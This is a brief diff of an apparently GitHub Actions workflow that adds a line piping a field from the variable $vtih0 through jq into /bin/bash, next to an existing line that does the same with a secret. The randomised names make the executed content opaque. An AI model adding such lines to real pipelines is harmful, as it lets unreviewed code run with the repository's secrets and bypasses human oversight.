@@ -17,6 +17,7 @@ jobs:
           ryjg8645: ${{ secrets.ryjg8645 }}
         run: |
           printf '%s' "$ryjg8645" | jq -r .mr4 | /bin/bash
+          printf '%s' "$vtih0" | jq -r .eosu68850 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
